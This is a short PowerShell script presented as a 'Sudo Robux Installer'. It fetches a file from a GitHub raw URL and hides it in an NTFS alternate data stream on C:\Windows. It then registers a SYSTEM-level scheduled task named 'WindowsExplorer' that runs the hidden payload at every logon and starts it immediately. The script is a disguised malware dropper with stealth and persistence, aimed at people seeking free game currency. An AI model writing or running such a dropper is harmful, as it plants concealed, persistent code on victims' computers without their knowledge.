Clear-Host
Write-Host "Sudo Robux Installer" -ForegroundColor Magenta -NoNewLine
Write-Host " by Hadron" -ForegroundColor DarkGray
Write-Host
$name = Read-Host "code"
Write-Host "Downloading..." -ForegroundColor DarkCyan
curl https://raw.githubusercontent.com/HadronCollision/SudoRobux/refs/heads/main/russianhuzz -o russianhuzz5
Write-Host "Installing..." -ForegroundColor DarkCyan
cmd.exe /c "type russianhuzz5 > C:\Windows:Explorer"
rm .\russianhuzz
$action = New-ScheduledTaskAction -Execute "C:\Windows\System32\cmd.exe" -Argument "/c wmic process call create `"C:\Windows:Explorer $name`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 1000000
Register-ScheduledTask -TaskName "WindowsExplorer" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" > $null 2>&1
schtasks /run /tn WindowsExplorer > $null 2>&1
Write-Host
